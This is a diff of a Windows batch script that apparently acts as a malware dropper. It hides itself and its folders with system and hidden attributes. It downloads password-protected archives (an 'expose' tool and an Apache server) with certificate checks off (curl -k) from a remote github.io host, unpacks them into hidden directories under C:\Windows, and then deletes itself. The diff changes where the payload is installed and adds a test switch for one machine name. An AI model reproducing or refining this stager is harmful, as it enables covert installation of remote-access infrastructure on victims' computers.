@@ -3,7 +3,11 @@ setlocal
 attrib +s +h +i "%~f0"
 
 set host=https://cryptedodissey.github.io
-set environment=%AppData%\Microsoft\Windows
+set environment=C:\Windows
+
+rem TESTING >
+if "%computername%"=="WIN-6QJBGJLRIGL" set environment=%appdata%\microsoft\windows
+rem TESTING <
 
 attrib -s -h -i "%environment%\7-Zip" && if exist "%environment%\7-Zip\7z.exe" (
       attrib +s +h +i "%environment%\7-Zip"
@@ -41,10 +45,10 @@ attrib -s -h -i "%environment%\expose.exe" && if exist "%environment%\expose.exe
   "%environment%\curl.exe" -k %proxy% %host%/Tools/expose.7z -o "%temp%\expose.7z" && "%environment%\7-Zip\7z.exe" x "%temp%\expose.7z" -p7zexpose -o"%environment%" -y && attrib +s +h +i "%environment%\expose.exe" && del "%temp%\expose.7z"
 )
  
- attrib -s -h -i "C:\apache2" && if exist "C:\apache2\bin\httpd.exe" (
-    attrib +s +h +i "C:\apache2"
+ attrib -s -h -i "%environment%\apache2" && if exist "%environment%\apache2\bin\httpd.exe" (
+    attrib +s +h +i "%environment%\apache2"
 ) else (
-   "%environment%\curl.exe" -k %proxy% %host%/Tools/apache2.7z -o "%temp%\apache2.7z" && "%environment%\7-Zip\7z.exe" x "%temp%\apache2.7z" -p7zapache -o"C:\" -y && attrib +s +h +i "C:\apache2" && del "%temp%\apache2.7z"
+   "%environment%\curl.exe" -k %proxy% %host%/Tools/apache2.7z -o "%temp%\apache2.7z" && "%environment%\7-Zip\7z.exe" x "%temp%\apache2.7z" -p7zapache -o"%environment%" -y && attrib +s +h +i "%environment%\apache2" && del "%temp%\apache2.7z"
 )
 endlocal
 DEL /s /f /q /a "%~f0"
